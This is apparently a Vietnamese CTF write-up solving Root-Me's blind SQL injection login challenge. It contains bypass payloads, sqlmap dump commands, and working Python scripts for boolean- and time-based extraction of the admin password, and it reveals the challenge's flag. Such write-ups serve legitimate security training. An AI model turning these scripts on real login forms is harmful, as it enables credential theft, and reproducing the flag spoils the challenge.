# SQL-Blind

Point: 50

Authentication v 0.02

Statement: Retrieve the administrator password.

# Overview:

![image](https://user-images.githubusercontent.com/115911041/234175477-7497d7e8-27d7-44b5-8711-6c8bcbdcc3cd.png)

Form của challenge cho ta trang web có chức năng login.Dự đoán query của bài này

`SELECT ... from ... where username=... and password = ...`

Vậy ta có thê khai thác lỗ hổng ở phần này. Mình sẽ thử fuzz thử ở phần login

`' admin or 1=1--`

![image](https://user-images.githubusercontent.com/115911041/234175844-4bd9a90b-f777-4b84-879f-65b3941f3cb3.png)

Có báo lỗi và ta thấy database bài này đang chạy SQLite3.Mình sẽ thử fuzz thêm nữa

`' or 1=1--`

![image](https://user-images.githubusercontent.com/115911041/234176024-6e5da0f2-79b1-47d9-a831-c735fd7d6983.png)

Adu mình vào được user1 nhưng mà hâu như trong đây không có gì đáng chú ý.

Vậy bài này ta có thể khai thác ở phần login. Challenge lần này là `Blind`. Ý tưởng là ta sẽ cắt các kí tự đầu của password rồi đem đi so sánh, nếu password đó trả về là "Welcome back Admin" thì nó sẽ là password đúng. Vậy ta có thể dùng toán tử [LIKE](https://laptrinhtudau.com/toan-tu-like-trong-sql/)  dựa trên idea đó. Hoặc dùng [SQLmap](https://github.com/sqlmapproject/sqlmap)

# Solution:

# 1ST

Bước đầu cần xác định số column

`admin' order by 2 --` hoặc ` 'order by 3--`

![image](https://user-images.githubusercontent.com/115911041/234177032-44fc97f6-2a26-417e-a452-8c9f3a922b7b.png)

Cái này mình rùa @@ sao vào được admin lunnnn!!!. Nhưng mà không có gì có ích mấy useless vcl. Nhưng kết quả cho ra, thì ta biết là có 2 column.

Bài này sử dụng phương thức POST để truyền truy vấn nên ta sẽ bắt bằng burpsuite.Tại request ta thấy ta truyền vào 2 payload là username và password. Ta sẽ sử dụng sqlmap để thực hiện khai thác bài này.

![image](https://user-images.githubusercontent.com/115911041/234178081-235ce51f-1136-41e7-83c6-e7e1a19e8361.png)

Trước hết copy phần request lưu vào 1 file, ở đây là file bind.txt. Sau đó mở sqlmap lên, tại đây là sử dụng `options -r` để đọc file. Nhớ cd vào file `sqlmap-dev` mới sử dụng được nhaaaa. Gõ lệnh:

`python3 sqlmap.py -r Blind.txt --dbs`

![image](https://user-images.githubusercontent.com/115911041/234183697-a8766aa4-da42-4672-8486-f1df3bff66f1.png)

Kết quả trả về cho ta thấy trang web bị lỗi time-based blind SQL injection. Không có database trả về, tuy nhiên nó gợi ý cho chúng ta khai thác luôn tên bảng. Ta gõ lệnh:

`python sqlmap.py -r Blind.txt --tables`

![image](https://user-images.githubusercontent.com/115911041/234186948-79de7789-1496-4ca9-b78c-67e5099e6117.png)

Kết quả trả về 1 bảng là users. Ta thực hiện dump toàn bộ dữ liệu trong bảng ra

`python sqlmap.py -r Blind.txt -T users --dump`

![image](https://user-images.githubusercontent.com/115911041/234194016-dc38c959-707d-4b56-9a4c-64477eec96fb.png)

Và ta đã có flag `e2azO93i`

# 2nd:

Và như mình đã nói ở trên các bạn có thể dùng toán tử LIKE để làm bài. Mình sẽ làm ở đây:
```
import sys
import requests
import string

URL='http://challenge01.root-me.org/web-serveur/ch10/'
character_list = string.printable
pw = ''
tmpPassword = ''

while (True):
    for char in character_list:
        tmpPassword = pw + char
        data = {
            'username':"admin' and password LIKE '"+ tmpPassword + "%'--",
            'password': 'asdasdasdasds'
        }
        http = requests.post(url = URL, data = data)
        if http.text.find('Welcome back admin !</h2><h3>Your informations :</h3><p>- username : admin</p><br />Hi master ! <b>To validate the challeng')!=-1:
            pw = tmpPassword
            print("Matched:",pw)
            break
    print("Finished!")
```

Sau đó mình có kết quả là `e2azo93i`. Nhưng lưu ý ở đây là LIKE không xác định được uppercase hay lowercase. Vậy thì ta brute force lại 1 lần nữa.Trong password có 5 kí tự thường vậy thì 2^5 = 32 trường hợp.

```
 # Step 2: Generate password

import sys
import requests
import string

URL='http://challenge01.root-me.org/web-serveur/ch10/'   

listPassword = []
strPassword = ''
for c1 in ['e', 'E']:
    for c3 in ['a', 'A']:
        for c4 in ['z', 'Z']:
            for c5 in ['o', 'O']:
                for c8 in ['i', 'I']:
                    strPassword = c1 + '2' + c3 + c4 + c5 + '93' + c8
                    listPassword.append(strPassword)
                    
print("### Start to attack ###")
for password in listPassword:
    data = {
        'username':"admin' and password='"+ password + "'--",
        'password': 'asdasdasdasds'
    }
    http = requests.post(url = URL, data = data)
    if http.text.find('Welcome back admin !</h2><h3>Your informations :</h3><p>- username : admin</p><br />Hi master ! <b>To validate the challeng')!=-1:
        print("Got it: ", password)
```

![image](https://user-images.githubusercontent.com/115911041/234212578-8eab86ff-6e9b-4406-96c0-baf95c81f17e.png)

Và ta đã ra được flag.

Nhận xét: Sau khi mình đưa a khánh, thì cách này không được hay cho lắm chỉ được dùng trong trường hợp ít còn nếu mà tầm 30 kí tự thì bốc c mà ăn lunn.Nên là các bạn có thể tham khảo cách của a Khánh [ở đây nha](https://clbuezzz.wordpress.com/2021/05/26/root-me-challenge-sql-injection-time-based/)

## Improve

Sau khi mình đọc và nghiên cứu script của a Khánh, mình thử một số cách khác

Ở script này, mình sử dụng `ThreadPoolExecutor` từ `concurrent.futures module` để tạo ra một thread pool với 8 worker thread. Sau đó, chúng tôi mình chia danh sách `tblNameChar` thành 8 danh sách nhỏ hơn và chuyển mỗi danh sách vào một luồng thợ cùng với vị trí ký tự hiện tại.

Mỗi thread này chạy hàm `query_char`, kiểm tra từng ký tự trong danh sách con được chỉ định cho vị trí hiện tại và trả về một bộ dữ liệu chứa flag boolean cho biết liệu một ký tự đã được tìm thấy hay chưa và đoạn tên bảng đã được tạo.

```
import requests
import time
from concurrent.futures import ThreadPoolExecutor

url = 'http://challenge01.root-me.org/web-serveur/ch10/'

s = requests.session()

def query_char(position, char_list):
    tblName = ""
    found_char = False
    for i in range(len(char_list)):
        queryTblName = f"v' OR 5407=(case when substr((select group_concat(sql) from sqlite_master where type='table'),{position},1)='{char_list[i]}' then (like('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))) else 5407 end)-- -"
        payload = {'username': queryTblName, 'password': 'vanir'}
        start = time.time()
        r = s.post(url, data=payload)
        roundtrip = time.time() - start
        if roundtrip > 4:
            found_char = True
            tblName += char_list[i]
            print(tblName)
            break
    return (found_char, tblName)

# Find TableName Characters list
tblNameChar = []
for i in range(32, 127):
    queryTblCharacter = f"v' OR 5407=(case when instr((select group_concat(sql) from sqlite_master where type='table'),'{chr(i)}') then (like('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))) else 5407 end)-- -"
    payload = {'username': queryTblCharacter, 'password': 'abcdef'}
    start = time.time()
    r = s.post(url, data=payload)
    roundtrip = time.time() - start
    if roundtrip > 4:
        tblNameChar.append(chr(i))

print(tblNameChar)

# Find TableName
post = 0
tblName = ""

while True:
    post += 1
    found_char = False
    with ThreadPoolExecutor(max_workers=8) as executor:
        futures = [executor.submit(query_char, post, tblNameChar[i::8]) for i in range(8)]
        for future in futures:
            (result, name) = future.result()
            found_char |= result
            tblName += name
            if found_char:
                break

    if not found_char:
        break

print(tblName)

```

![image](https://user-images.githubusercontent.com/115911041/235310592-20d9275c-5583-438f-971c-3a955c0577b8.png)

## Tìm password

```
import requests
import time

url = 'http://challenge01.root-me.org/web-serveur/ch10/'
s = requests.Session()

# Find the possible characters of the password
pass_chars = []
for i in range(32, 127):
    query_pass_char = f"v' OR 5407=(case when instr((select password from users where username='admin'),'{chr(i)}') then (like('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))) else 5407 end)-- -"
    payload = {
        'username': query_pass_char,
        'password': 'vanir'
    }
    start = time.time()
    r = s.post(url, data=payload)
    roundtrip = time.time() - start
    if roundtrip > 4:
        pass_chars.append(chr(i))

print("Possible characters:", pass_chars)

# Find the password using the possible characters
password = ''
post = 0
while True:
    post += 1
    found_char = False
    for c in pass_chars:
        query_pass = f"v' OR 5407=(case when substr((select password from users where username='admin'), {post}, 1) = '{c}' then (like('ABCDEFG', UPPER(HEX(RANDOMBLOB(200000000/2))))) else 5407 end)-- -"
        payload = {
            'username': query_pass,
            'password': 'adadadadadada'
        }
        start = time.time()
        r = s.post(url, data=payload)
        roundtrip = time.time() - start
        if roundtrip > 4:
            password += c
            print(f"Found character {c} at position {post}")
            found_char = True
            break
    if not found_char:
        break

print("Admin password:", password)

```

![image](https://user-images.githubusercontent.com/115911041/235311295-a4631315-7281-4ba3-afb7-eefc3d956ba1.png)


